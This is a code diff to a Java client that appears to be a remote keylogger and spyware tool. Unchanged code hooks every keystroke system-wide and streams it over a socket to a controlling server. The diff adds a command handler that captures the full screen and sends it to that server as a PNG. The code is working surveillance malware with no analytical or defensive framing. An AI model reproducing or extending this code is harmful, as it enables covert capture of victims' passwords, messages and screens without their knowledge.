@@ -1,3 +1,8 @@
+import java.awt.AWTException;
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.Toolkit;
+import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.IOException;
@@ -5,7 +10,7 @@ import java.io.InputStreamReader;
 import java.net.InetAddress;
 import java.net.Socket;
 
-import javax.swing.JOptionPane;
+import javax.imageio.ImageIO;
 
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
@@ -120,6 +125,18 @@ public class Connection {
 
 					} else if (requestHeader.equals(PacketHeader.PICT)) { // If picture request is received
 
+						// Takes the screenshot of the screen
+						System.out.println("TAKING SCREENSHOT");
+						Rectangle screenDimensions = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+						BufferedImage screenshot = new Robot().createScreenCapture(screenDimensions);
+
+						// Write the image to the server
+						System.out.println("SENDING SCREENSHOT");
+						connection.getOutputStream().flush();
+						ImageIO.write(screenshot, "PNG", connection.getOutputStream());
+						connection.getOutputStream().flush();
+						System.out.println("SCREENSHOT SENT");
+						
 					} else if (requestHeader.equals(PacketHeader.KILL)) { // If kill request is received
 						System.out.println("KILL REQUEST RECEIVED");
 						shutdown();
@@ -128,11 +145,16 @@ public class Connection {
 				}
 			}
 
+		} catch (AWTException ae) { // If the screenshot at pict couldn't be taken
+			System.out.println("FAILED TO TAKE SCREENSHOT");
+			// TODO send lols screenshot
+
 		} catch (IOException ie) { // If connection was disconnected at any point
 
 			// Try to close all input streams
 			shutdown();
-
+			ie.printStackTrace();
+			
 			// Tells main method that connection was disconnected
 			throw new IOException("Connection disconnected");
 		}
@@ -151,7 +173,7 @@ public class Connection {
 		 */
 		@Override
 		public void run() {
-			
+
 			// Try to register the native key hook
 			try {GlobalScreen.registerNativeHook();}
 			catch (NativeHookException e) { // If unsuccessful, close program
@@ -183,7 +205,7 @@ public class Connection {
 			// Try sending the key
 			try {output.writeBytes(KeyInterpreter.interpretKey(e, isPress) 
 					+ System.getProperty("line.separator"));}
-			
+
 			catch (IOException ioe) { // Otherwise close the native key hook and sockets and stuff
 				try { 
 					GlobalScreen.unregisterNativeHook();
